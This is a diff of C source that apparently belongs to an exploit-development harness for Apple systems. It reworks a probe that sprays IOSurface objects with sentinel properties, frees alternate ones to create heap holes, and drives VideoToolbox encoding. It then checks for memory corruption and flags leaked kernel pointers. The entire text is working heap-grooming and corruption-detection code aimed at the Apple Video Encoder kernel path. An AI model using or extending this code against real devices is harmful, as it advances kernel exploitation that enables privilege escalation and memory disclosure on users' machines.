@@ -17315,7 +17315,7 @@ static void r450_probe(void) {
 
 
 static void r451_probe(void) {
-    rlog("\n=== r451: AVE corruption CONTROL experiment ===\n\n");
+    rlog("\n=== r451: AVE corruption CONTROL v2 (IOSurfaceSetValue) ===\n\n");
     fflush(stdout);
 
     #define R451_SPRAY 30
@@ -17324,67 +17324,115 @@ static void r451_probe(void) {
 
     int enc_w = 128, enc_h = 128;
 
-    /* ========== PHASE A: No encoding, spray+free only (baseline) ========== */
-    rlog("  --- PHASE A: spray+free, NO encoding ---\n"); fflush(stdout);
+    /* Helper: create a minimal IOSurface */
+    #define R451_MAKE_SURF(arr, idx) do { \
+        CFMutableDictionaryRef _p = CFDictionaryCreateMutable(NULL, 0, \
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks); \
+        int _w = 16, _h = 16, _bpe = 4, _pf = 0x42475241; \
+        CFNumberRef _wn = CFNumberCreate(NULL, kCFNumberIntType, &_w); \
+        CFNumberRef _hn = CFNumberCreate(NULL, kCFNumberIntType, &_h); \
+        CFNumberRef _bn = CFNumberCreate(NULL, kCFNumberIntType, &_bpe); \
+        CFNumberRef _pn = CFNumberCreate(NULL, kCFNumberIntType, &_pf); \
+        CFDictionarySetValue(_p, CFSTR("IOSurfaceWidth"), _wn); \
+        CFDictionarySetValue(_p, CFSTR("IOSurfaceHeight"), _hn); \
+        CFDictionarySetValue(_p, CFSTR("IOSurfaceBytesPerElement"), _bn); \
+        CFDictionarySetValue(_p, CFSTR("IOSurfacePixelFormat"), _pn); \
+        (arr)[(idx)] = IOSurfaceCreate(_p); \
+        CFRelease(_p); CFRelease(_wn); CFRelease(_hn); CFRelease(_bn); CFRelease(_pn); \
+    } while(0)
+
+    /* Helper: set sentinel property AFTER creation via IOSurfaceSetValue */
+    #define R451_SET_PROP(surf, prefix, idx) do { \
+        uint8_t _sd[R451_PROP_SZ]; \
+        for (int _j = 0; _j < R451_PROP_SZ; _j += 8) { \
+            uint64_t _m = R451_MAGIC ^ ((uint64_t)(idx) << 32) ^ (uint64_t)_j; \
+            memcpy(&_sd[_j], &_m, 8); \
+        } \
+        CFDataRef _d = CFDataCreate(NULL, _sd, R451_PROP_SZ); \
+        char _kn[32]; snprintf(_kn, 32, "%s%03d", (prefix), (idx)); \
+        CFStringRef _k = CFStringCreateWithCString(NULL, _kn, kCFStringEncodingASCII); \
+        IOSurfaceSetValue((surf), _k, _d); \
+        CFRelease(_d); CFRelease(_k); \
+    } while(0)
+
+    /* Helper: check sentinel property */
+    #define R451_CHECK_PROP(surf, prefix, idx, missing_p, bad_p) do { \
+        char _kn[32]; snprintf(_kn, 32, "%s%03d", (prefix), (idx)); \
+        CFStringRef _k = CFStringCreateWithCString(NULL, _kn, kCFStringEncodingASCII); \
+        CFTypeRef _v = IOSurfaceCopyValue((surf), _k); \
+        CFRelease(_k); \
+        uint32_t _sid = IOSurfaceGetID((surf)); \
+        if (!_v) { \
+            rlog("    [%d]: MISSING sid=%u\n", (idx), _sid); \
+            (*(missing_p))++; \
+        } else if (CFGetTypeID(_v) == CFDataGetTypeID()) { \
+            CFDataRef _dv = (CFDataRef)_v; \
+            const uint8_t *_b = CFDataGetBytePtr(_dv); \
+            CFIndex _len = CFDataGetLength(_dv); \
+            int _wc = 0; \
+            for (int _j = 0; _j + 7 < _len && _j < R451_PROP_SZ; _j += 8) { \
+                uint64_t _exp = R451_MAGIC ^ ((uint64_t)(idx) << 32) ^ (uint64_t)_j; \
+                uint64_t _act; memcpy(&_act, &_b[_j], 8); \
+                if (_act != _exp) { \
+                    _wc++; \
+                    if (_wc <= 4) \
+                        rlog("    [%d]+%d: 0x%llx (exp 0x%llx)%s\n", (idx), _j, \
+                             (unsigned long long)_act, (unsigned long long)_exp, \
+                             ((_act >> 48) == 0xffff || (_act >> 48) == 0xfffe) ? " ***KPTR***" : ""); \
+                } \
+            } \
+            if (_wc) { (*(bad_p))++; rlog("    [%d]: %d words CORRUPTED sid=%u\n", (idx), _wc, _sid); } \
+            CFRelease(_v); \
+        } else { \
+            rlog("    [%d]: WRONG TYPE=%lu sid=%u\n", (idx), CFGetTypeID(_v), _sid); \
+            (*(bad_p))++; CFRelease(_v); \
+        } \
+    } while(0)
+
+    /* ========== PHASE A: Baseline — spray + SetValue + free holes, NO encoding ========== */
+    rlog("  --- PHASE A: spray+SetValue+free, NO encoding ---\n"); fflush(stdout);
     {
         IOSurfaceRef surfs[R451_SPRAY];
         memset(surfs, 0, sizeof(surfs));
-        int created = 0, missing = 0, scanned = 0;
+        int created = 0, missing = 0, bad = 0, scanned = 0;
         for (int i = 0; i < R451_SPRAY; i++) {
-            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
-                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-            int w = 16, h = 16, bpe = 4, pf = 0x42475241;
-            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
-            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
-            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
-            CFNumberRef pn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
-            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
-            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
-            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
-            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pn);
-            uint8_t sd[R451_PROP_SZ];
-            for (int j = 0; j < R451_PROP_SZ; j += 8) {
-                uint64_t m = R451_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
-                memcpy(&sd[j], &m, 8);
-            }
-            CFDataRef d = CFDataCreate(NULL, sd, R451_PROP_SZ);
-            char kn[32]; snprintf(kn, 32, "a%03d", i);
-            CFStringRef k = CFStringCreateWithCString(NULL, kn, kCFStringEncodingASCII);
-            CFDictionarySetValue(p, k, d);
-            CFRelease(d); CFRelease(k);
-            surfs[i] = IOSurfaceCreate(p);
-            CFRelease(p); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pn);
-            if (surfs[i]) created++;
+            R451_MAKE_SURF(surfs, i);
+            if (surfs[i]) { created++; R451_SET_PROP(surfs[i], "a", i); }
         }
-        rlog("    Created %d/%d\n", created, R451_SPRAY); fflush(stdout);
-        for (int i = 0; i < R451_SPRAY; i += 2) {
-            if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; }
-        }
-        rlog("    Freed even-indexed (holes)\n"); fflush(stdout);
-        /* NO ENCODING — just check properties */
-        for (int i = 1; i < R451_SPRAY; i += 2) {
+        rlog("    Created %d, set properties via IOSurfaceSetValue\n", created); fflush(stdout);
+        /* Verify they can be read back BEFORE any operations */
+        int pre_ok = 0;
+        for (int i = 0; i < R451_SPRAY; i++) {
             if (!surfs[i]) continue;
-            scanned++;
             char kn[32]; snprintf(kn, 32, "a%03d", i);
             CFStringRef k = CFStringCreateWithCString(NULL, kn, kCFStringEncodingASCII);
             CFTypeRef v = IOSurfaceCopyValue(surfs[i], k);
             CFRelease(k);
-            uint32_t sid = IOSurfaceGetID(surfs[i]);
-            int wid = (int)IOSurfaceGetWidth(surfs[i]);
-            if (!v) { rlog("    [%d]: MISSING sid=%u w=%d\n", i, sid, wid); missing++; }
-            else { CFRelease(v); }
+            if (v) { pre_ok++; CFRelease(v); }
         }
-        rlog("  PHASE A: missing=%d/%d (expect 0)\n\n", missing, scanned); fflush(stdout);
+        rlog("    Pre-check: %d/%d readable\n", pre_ok, created); fflush(stdout);
+
+        for (int i = 0; i < R451_SPRAY; i += 2) {
+            if (surfs[i]) { CFRelease(surfs[i]); surfs[i] = NULL; }
+        }
+        rlog("    Freed even-indexed (holes)\n"); fflush(stdout);
+        for (int i = 1; i < R451_SPRAY; i += 2) {
+            if (!surfs[i]) continue;
+            scanned++;
+            R451_CHECK_PROP(surfs[i], "a", i, &missing, &bad);
+        }
+        rlog("  PHASE A: missing=%d bad=%d / %d (expect all 0)\n\n", missing, bad, scanned);
+        fflush(stdout);
         for (int i = 0; i < R451_SPRAY; i++)
             if (surfs[i]) CFRelease(surfs[i]);
     }
 
-    /* ========== PHASE B: Encoding + spray, NO holes (no free) ========== */
-    rlog("  --- PHASE B: spray + encoding, NO holes freed ---\n"); fflush(stdout);
+    /* ========== PHASE B: Encoding + spray, NO holes freed ========== */
+    rlog("  --- PHASE B: spray+SetValue + encoding, NO holes ---\n"); fflush(stdout);
     {
         IOSurfaceRef surfs[R451_SPRAY];
         memset(surfs, 0, sizeof(surfs));
-        int created = 0, missing = 0, scanned = 0;
+        int created = 0, missing = 0, bad = 0, scanned = 0;
 
         VTCompressionSessionRef enc = NULL;
         CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
@@ -17403,36 +17451,14 @@ static void r451_probe(void) {
         VTCompressionSessionPrepareToEncodeFrames(enc);
 
         CVPixelBufferRef pb = create_pb(enc_w, enc_h);
-        if (!pb) { rlog("    FAIL: no pixbuf B\n"); VTCompressionSessionInvalidate(enc); CFRelease(enc); goto phase_b_done; }
+        if (!pb) { rlog("    FAIL: no pixbuf\n"); VTCompressionSessionInvalidate(enc); CFRelease(enc); goto phase_b_done; }
 
         for (int i = 0; i < R451_SPRAY; i++) {
-            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
-                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-            int w = 16, h = 16, bpe = 4, pf = 0x42475241;
-            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
-            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
-            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
-            CFNumberRef pn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
-            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
-            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
-            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
-            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pn);
-            uint8_t sd[R451_PROP_SZ];
-            for (int j = 0; j < R451_PROP_SZ; j += 8) {
-                uint64_t m = R451_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
-                memcpy(&sd[j], &m, 8);
-            }
-            CFDataRef d = CFDataCreate(NULL, sd, R451_PROP_SZ);
-            char kn[32]; snprintf(kn, 32, "b%03d", i);
-            CFStringRef k = CFStringCreateWithCString(NULL, kn, kCFStringEncodingASCII);
-            CFDictionarySetValue(p, k, d);
-            CFRelease(d); CFRelease(k);
-            surfs[i] = IOSurfaceCreate(p);
-            CFRelease(p); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pn);
-            if (surfs[i]) created++;
+            R451_MAKE_SURF(surfs, i);
+            if (surfs[i]) { created++; R451_SET_PROP(surfs[i], "b", i); }
         }
-        rlog("    Created %d/%d\n", created, R451_SPRAY); fflush(stdout);
-        /* NO HOLES — don't free anything */
+        rlog("    Created %d, set properties\n", created); fflush(stdout);
+        /* NO HOLES */
         rlog("    Encoding 200 frames (no holes)...\n"); fflush(stdout);
         g_cb_count = 0;
         int enc_ok = 0, enc_fail = 0;
@@ -17447,15 +17473,10 @@ static void r451_probe(void) {
         for (int i = 0; i < R451_SPRAY; i++) {
             if (!surfs[i]) continue;
             scanned++;
-            char kn[32]; snprintf(kn, 32, "b%03d", i);
-            CFStringRef k = CFStringCreateWithCString(NULL, kn, kCFStringEncodingASCII);
-            CFTypeRef v = IOSurfaceCopyValue(surfs[i], k);
-            CFRelease(k);
-            uint32_t sid = IOSurfaceGetID(surfs[i]);
-            if (!v) { rlog("    [%d]: MISSING sid=%u\n", i, sid); missing++; }
-            else { CFRelease(v); }
+            R451_CHECK_PROP(surfs[i], "b", i, &missing, &bad);
         }
-        rlog("  PHASE B: missing=%d/%d (encoding WITHOUT holes)\n\n", missing, scanned); fflush(stdout);
+        rlog("  PHASE B: missing=%d bad=%d / %d (no holes, encoding only)\n\n", missing, bad, scanned);
+        fflush(stdout);
 
         CVPixelBufferRelease(pb);
         VTCompressionSessionInvalidate(enc); CFRelease(enc);
@@ -17464,12 +17485,12 @@ static void r451_probe(void) {
             if (surfs[i]) CFRelease(surfs[i]);
     }
 
-    /* ========== PHASE C: Original pattern + surface validity check ========== */
-    rlog("  --- PHASE C: spray + holes + encoding (+ validity) ---\n"); fflush(stdout);
+    /* ========== PHASE C: Spray + holes + encoding (full pattern) ========== */
+    rlog("  --- PHASE C: spray+SetValue + holes + encoding ---\n"); fflush(stdout);
     {
         IOSurfaceRef surfs[R451_SPRAY];
         memset(surfs, 0, sizeof(surfs));
-        int created = 0, missing = 0, scanned = 0, bad_data = 0;
+        int created = 0, missing = 0, bad = 0, scanned = 0;
 
         VTCompressionSessionRef enc = NULL;
         CFMutableDictionaryRef es = CFDictionaryCreateMutable(NULL, 0,
@@ -17488,35 +17509,13 @@ static void r451_probe(void) {
         VTCompressionSessionPrepareToEncodeFrames(enc);
 
         CVPixelBufferRef pb = create_pb(enc_w, enc_h);
-        if (!pb) { rlog("    FAIL: no pixbuf C\n"); VTCompressionSessionInvalidate(enc); CFRelease(enc); goto phase_c_done; }
+        if (!pb) { rlog("    FAIL: no pixbuf\n"); VTCompressionSessionInvalidate(enc); CFRelease(enc); goto phase_c_done; }
 
         for (int i = 0; i < R451_SPRAY; i++) {
-            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
-                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
-            int w = 16, h = 16, bpe = 4, pf = 0x42475241;
-            CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
-            CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
-            CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
-            CFNumberRef pn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
-            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), wn);
-            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), hn);
-            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), bn);
-            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), pn);
-            uint8_t sd[R451_PROP_SZ];
-            for (int j = 0; j < R451_PROP_SZ; j += 8) {
-                uint64_t m = R451_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
-                memcpy(&sd[j], &m, 8);
-            }
-            CFDataRef d = CFDataCreate(NULL, sd, R451_PROP_SZ);
-            char kn[32]; snprintf(kn, 32, "c%03d", i);
-            CFStringRef k = CFStringCreateWithCString(NULL, kn, kCFStringEncodingASCII);
-            CFDictionarySetValue(p, k, d);
-            CFRelease(d); CFRelease(k);
-            surfs[i] = IOSurfaceCreate(p);
-            CFRelease(p); CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(pn);
-            if (surfs[i]) created++;
+            R451_MAKE_SURF(surfs, i);
+            if (surfs[i]) { created++; R451_SET_PROP(surfs[i], "c", i); }
         }
-        rlog("    Created %d/%d\n", created, R451_SPRAY); fflush(stdout);
+        rlog("    Created %d, set properties\n", created); fflush(stdout);
 
         int freed = 0;
         for (int i = 0; i < R451_SPRAY; i += 2) {
@@ -17535,46 +17534,14 @@ static void r451_probe(void) {
         VTCompressionSessionCompleteFrames(enc, kCMTimeInvalid);
         rlog("    Encode: ok=%d fail=%d cb=%d\n", enc_ok, enc_fail, g_cb_count); fflush(stdout);
 
-        rlog("    Scanning with validity checks...\n"); fflush(stdout);
+        rlog("    Scanning...\n"); fflush(stdout);
         for (int i = 1; i < R451_SPRAY; i += 2) {
             if (!surfs[i]) continue;
             scanned++;
-            uint32_t sid = IOSurfaceGetID(surfs[i]);
-            int wid = (int)IOSurfaceGetWidth(surfs[i]);
-            int hgt = (int)IOSurfaceGetHeight(surfs[i]);
-            size_t apc = IOSurfaceGetAllocSize(surfs[i]);
-            char kn[32]; snprintf(kn, 32, "c%03d", i);
-            CFStringRef k = CFStringCreateWithCString(NULL, kn, kCFStringEncodingASCII);
-            CFTypeRef v = IOSurfaceCopyValue(surfs[i], k);
-            CFRelease(k);
-            if (!v) {
-                rlog("    [%d]: MISSING sid=%u w=%d h=%d alloc=%zu\n", i, sid, wid, hgt, apc);
-                missing++;
-            } else if (CFGetTypeID(v) == CFDataGetTypeID()) {
-                CFDataRef dv = (CFDataRef)v;
-                const uint8_t *b = CFDataGetBytePtr(dv);
-                CFIndex len = CFDataGetLength(dv);
-                int wc = 0;
-                for (int j = 0; j + 7 < len && j < R451_PROP_SZ; j += 8) {
-                    uint64_t exp = R451_MAGIC ^ ((uint64_t)i << 32) ^ (uint64_t)j;
-                    uint64_t act; memcpy(&act, &b[j], 8);
-                    if (act != exp) {
-                        wc++;
-                        if (wc <= 6)
-                            rlog("    [%d]+%d: 0x%llx (exp 0x%llx)%s\n", i, j,
-                                 (unsigned long long)act, (unsigned long long)exp,
-                                 ((act >> 48) == 0xffff || (act >> 48) == 0xfffe) ? " ***KPTR***" : "");
-                    }
-                }
-                if (wc) { bad_data++; rlog("    [%d]: %d words CORRUPTED sid=%u\n", i, wc, sid); }
-                CFRelease(v);
-            } else {
-                rlog("    [%d]: WRONG TYPE=%lu sid=%u\n", i, CFGetTypeID(v), sid);
-                bad_data++;
-                CFRelease(v);
-            }
+            R451_CHECK_PROP(surfs[i], "c", i, &missing, &bad);
         }
-        rlog("  PHASE C: missing=%d bad_data=%d / %d scanned\n\n", missing, bad_data, scanned); fflush(stdout);
+        rlog("  PHASE C: missing=%d bad=%d / %d (holes + encoding)\n\n", missing, bad, scanned);
+        fflush(stdout);
 
         CVPixelBufferRelease(pb);
         VTCompressionSessionInvalidate(enc); CFRelease(enc);
@@ -17583,17 +17550,20 @@ static void r451_probe(void) {
             if (surfs[i]) CFRelease(surfs[i]);
     }
 
-    rlog("=== r451 CONTROL EXPERIMENT COMPLETE ===\n");
-    rlog("  Phase A (no encode): expect 0 missing = surfaces survive without encoding\n");
-    rlog("  Phase B (no holes):  if 0 missing = encoding alone is NOT enough\n");
-    rlog("  Phase C (holes+enc): if >0 missing = HOLES ARE REQUIRED for corruption\n");
-    rlog("  If B>0: encoding itself corrupts ALL surface properties (not targeted)\n");
-    rlog("  If A>0: surfaces are being reclaimed (memory pressure issue)\n");
+    rlog("=== r451 CONTROL v2 COMPLETE ===\n");
+    rlog("  A=baseline B=encode-no-holes C=holes+encode\n");
+    rlog("  If A=0,B=0,C>0: REAL heap corruption (holes needed)\n");
+    rlog("  If A=0,B>0,C>0: Encoding alone corrupts properties\n");
+    rlog("  If A>0: IOSurfaceSetValue itself is broken\n");
 
+    #undef R451_MAKE_SURF
+    #undef R451_SET_PROP
+    #undef R451_CHECK_PROP
     #undef R451_SPRAY
     #undef R451_PROP_SZ
     #undef R451_MAGIC
 }
+
 
 
 static void r449_probe(void) {
